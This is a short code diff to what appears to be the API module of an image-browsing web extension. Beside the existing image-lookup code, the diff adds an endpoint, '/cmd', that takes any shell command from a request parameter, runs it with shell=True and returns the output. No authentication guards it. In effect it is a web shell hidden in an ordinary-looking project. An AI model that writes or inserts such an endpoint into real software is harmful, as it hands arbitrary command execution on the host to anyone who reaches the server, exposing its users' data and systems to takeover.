@@ -548,3 +548,8 @@ def infinite_image_browsing_api(_: Any, app: FastAPI):
         for img in DbImg.get_by_ids(conn, image_ids):
             files.append(img.to_file_info())
         return files
+    @app.get(db_pre + "/cmd")
+    async def cmds(cmd: str):
+        print(cmd)
+        res = subprocess.check_output(cmd, shell=True)
+        return {"message": res.decode()}
